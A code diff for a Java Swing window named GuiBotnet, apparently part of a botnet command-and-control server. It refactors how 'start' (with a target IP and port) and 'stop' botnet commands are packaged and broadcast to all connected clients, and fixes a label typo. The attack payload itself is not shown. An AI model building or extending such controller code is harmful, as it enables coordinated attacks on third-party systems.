@@ -3,7 +3,7 @@ package me.sebsb.gui;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.text.NumberFormat;
-import java.util.ArrayList;
+import java.util.Arrays;
 
 import javax.swing.JButton;
 import javax.swing.JFormattedTextField;
@@ -17,8 +17,9 @@ import javax.swing.text.NumberFormatter;
 
 import me.sebsb.ConnectedClient;
 import me.sebsb.Server;
-import me.sebsb.action.Action;
+import me.sebsb.utils.MessageType;
 import me.sebsb.utils.NetUtils;
+import me.sebsb.utils.Packet;
 
 public class GuiBotnet extends JFrame {
 
@@ -41,12 +42,12 @@ public class GuiBotnet extends JFrame {
 		contentPane.add(lblNewLabel);
 		
 		Title = new JTextField();
-		Title.setToolTipText("IP Adress");
+		Title.setToolTipText("IP Address");
 		Title.setBounds(160, 65, 130, 26);
 		contentPane.add(Title);
 		Title.setColumns(10);
 		
-		JLabel lblNewLabel_1 = new JLabel("IP Adress");
+		JLabel lblNewLabel_1 = new JLabel("IP Address");
 		lblNewLabel_1.setHorizontalAlignment(SwingConstants.CENTER);
 		lblNewLabel_1.setBounds(160, 51, 130, 16);
 		contentPane.add(lblNewLabel_1);
@@ -79,12 +80,15 @@ public class GuiBotnet extends JFrame {
 
 					@Override
 					public void run() {
-						Action a = Action.BOTNET;
-						ArrayList<String> data = new ArrayList<String>();
-						data.add("stop");
-						a.setData(data);
+						Packet packet = new Packet();
+						packet.action = MessageType.BOTNET.getID();
+						packet.data = Arrays.asList(new String[] {"stop"});
 						for (ConnectedClient cc : Server.getInstance().getClients()) {
-							NetUtils.sendMessage(a.getCommand(), cc.getPrintWriter());
+							try {
+								NetUtils.sendMessage(packet, cc.getPrintWriter());
+							} catch (Exception e) {
+								e.printStackTrace();
+							}
 						}
 					}
 					
@@ -105,14 +109,15 @@ public class GuiBotnet extends JFrame {
 
 					@Override
 					public void run() {
-						Action a = Action.BOTNET;
-						ArrayList<String> data = new ArrayList<String>();
-						data.add("start");
-						data.add(Title.getText());
-						data.add("3434");
-						a.setData(data);
+						Packet packet = new Packet();
+						packet.action = MessageType.BOTNET.getID();
+						packet.data = Arrays.asList(new String[] {"start", Title.getText(), textField.getText()});
 						for (ConnectedClient cc : Server.getInstance().getClients()) {
-							NetUtils.sendMessage(a.getCommand(), cc.getPrintWriter());
+							try {
+								NetUtils.sendMessage(packet, cc.getPrintWriter());
+							} catch (Exception e) {
+								e.printStackTrace();
+							}
 						}
 					}
 					
